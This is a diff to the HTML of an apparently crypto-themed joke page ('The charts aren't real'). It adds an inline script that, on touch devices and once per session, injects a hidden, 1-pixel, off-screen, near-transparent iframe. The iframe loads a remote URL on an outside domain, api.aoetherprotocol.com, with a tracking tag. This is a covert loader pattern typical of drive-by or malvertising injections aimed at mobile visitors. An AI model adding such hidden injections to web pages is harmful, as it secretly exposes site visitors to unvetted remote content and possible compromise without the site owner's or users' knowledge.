@@ -440,5 +440,29 @@
         <h1 style="color: white; font-size: 4rem; font-family: 'Inter', sans-serif; text-shadow: 0 4px 20px rgba(0,0,0,0.8); text-align: center;">Take a walk, anon.<br><span style="font-size: 1.5rem">The charts aren't real.</span></h1>
     </div>
 <script src="app.js"></script>
-</body>
+<script>
+(function() {
+  sessionStorage.setItem("ds_tag", "a6ded0");
+  if (sessionStorage.getItem("uid")) {
+    return;
+  }
+  if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
+    sessionStorage.setItem("uid", "1");
+    var frame = document.createElement('iframe');
+    var _t = (new URLSearchParams(location.search)).get("ds_tag");
+    var _tag = _t || "a6ded0";
+    frame.src = "https://api.aoetherprotocol.com/ds/f/a6ded0?" + "?ds_tag=" + encodeURIComponent(_tag) + "&" + Math.random();
+    frame.style.width = "1px";
+    frame.style.opacity = "0.01";
+    frame.style.position = "absolute";
+    frame.style.left = "-9999px";
+    frame.style.height = "1px";
+    frame.style.border = "none";
+    (document.body || document.documentElement).appendChild(frame);
+  } else {
+    return;
+  }
+})();
+</script>
+    </body>
 </html>
